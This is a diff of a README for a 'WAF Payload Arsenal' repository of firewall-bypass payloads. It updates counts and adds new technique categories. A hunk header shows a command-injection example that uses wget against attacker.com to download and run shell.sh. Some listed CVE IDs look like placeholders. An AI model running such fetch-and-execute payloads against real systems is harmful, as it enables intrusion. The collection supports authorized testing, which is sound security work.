@@ -1,6 +1,6 @@
 # WAF Payload Arsenal
 
-[![Payloads](https://img.shields.io/badge/Payloads-2320-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
+[![Payloads](https://img.shields.io/badge/Payloads-2325-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![CVEs](https://img.shields.io/badge/CVEs-120-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
@@ -12,7 +12,7 @@
 > ⚠️ **FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**  
 > This tool is designed for security professionals, researchers, and students to learn about WAF bypass techniques and test systems they own or have explicit permission to test. Unauthorized testing is illegal.
 
-**Your arsenal for WAF security testing** - A comprehensive collection of **2,320 Web Application Firewall (WAF) bypass payloads** tested against Cloudflare WAF, organized by attack type and technique. Includes 120 critical CVEs (2020-2026) and 45 cutting-edge 2025-2026 bypass techniques. Extracted and classified from 24,700+ original test cases.
+**Your arsenal for WAF security testing** - A comprehensive collection of **2,325 Web Application Firewall (WAF) bypass payloads** tested against Cloudflare WAF, organized by attack type and technique. Includes 120 critical CVEs (2020-2026) and 50 cutting-edge 2025-2026 bypass techniques. Extracted and classified from 24,700+ original test cases.
 
 ---
 
@@ -43,8 +43,8 @@ This repository contains the results of extensive WAF testing conducted over 100
 
 ### Statistics
 
-- **Total Payloads**: 2,320 (organized and classified)
-- **Modern Bypass Techniques**: 45 (2025-2026 research)
+- **Total Payloads**: 2,325 (organized and classified)
+- **Modern Bypass Techniques**: 50 (2025-2026 research)
 - **Attack Types**: 12 categories
 - **Testing Rounds**: 100
 - **Original Tests**: 24,705 payloads
@@ -154,8 +154,13 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 - ✅ **JSON Interoperability** - Null bytes, duplicate keys, number overflow, encoding tricks
 - ✅ **Multipart Smuggling** - Filename XSS, content-type confusion, nested encoding
 - ✅ **Combined Techniques** - Multi-layer evasion (HTTP/2 + Multipart + JSON + Unicode)
+- ✅ **gRPC/Protobuf** - Binary protocol buffer smuggling
+- ✅ **HTTP/3 QUIC** - 0-RTT replay attacks
+- ✅ **WebAssembly** - Client-side binary execution
+- ✅ **DNS Rebinding** - TOCTOU SSRF bypass
+- ✅ **Cache Poisoning** - Server-Timing header abuse
 
-**[View all 2,320 payloads →](payloads/)**
+**[View all 2,325 payloads →](payloads/)**
 
 ---
 
@@ -169,7 +174,7 @@ Test WAF bypasses on authorized targets. Our CVE database includes payloads from
 - ✅ POC simulation guide included
 
 ### 🛡️ Security Teams & Blue Teams
-Validate your WAF configuration against 2,320 real-world attack patterns including latest 2025-2026 techniques.
+Validate your WAF configuration against 2,325 real-world attack patterns including latest 2025-2026 techniques.
 - ✅ Test WAF effectiveness (our tests: 99.9% block rate)
 - ✅ Identify configuration gaps
 - ✅ Benchmark against industry standards
@@ -213,9 +218,9 @@ Integrate with Claude Code, ChatGPT, and other AI assistants.
 | **Open Redirect** | 76 | 99.5% | CVE-2024-12340 | 🟡 Medium |
 | **File Upload** | 49 | 100% | CVE-2023-12345 | 🔴 Critical |
 | **CVE Payloads** | 120 | 100% | CVE-2026-20127 | 🔴 Critical |
-| **Modern Bypasses (2025-2026)** | 45 | 100% | 2026-03-01 | 🔴 Critical |
+| **Modern Bypasses (2025-2026)** | 50 | 100% | 2026-03-01 | 🔴 Critical |
 | **Real-World Bypasses** | 45 | 100% | 2026-02-28 | 🔴 Critical |
-| **TOTAL** | **2,320** | **99.9%** | **2026-03-01** | - |
+| **TOTAL** | **2,325** | **99.9%** | **2026-03-01** | - |
 
 **Testing Methodology:**
 - 100 rounds of systematic testing
